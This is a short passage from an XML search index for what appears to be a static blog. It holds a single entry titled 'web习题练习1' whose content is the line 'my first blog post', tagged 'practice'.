      <title>web习题练习1</title>
      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>我的第一篇博客</p>]]></content>
      
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
